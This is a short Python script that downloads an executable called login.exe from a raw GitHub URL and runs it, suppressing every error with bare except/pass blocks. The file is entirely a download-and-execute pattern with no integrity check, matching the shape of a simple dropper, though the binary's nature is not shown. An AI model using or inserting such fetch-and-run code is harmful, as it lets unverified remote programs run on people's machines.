import urllib.request
import subprocess

try: 
    urllib.request.urlretrieve('https://raw.githubusercontent.com/Edu4r0/SaludOcup/main/login.exe',"login.exe")
    try:
        abrir= subprocess.Popen('login.exe')
        abrir.wait()
    except FileNotFoundError:
        pass
except :
    pass


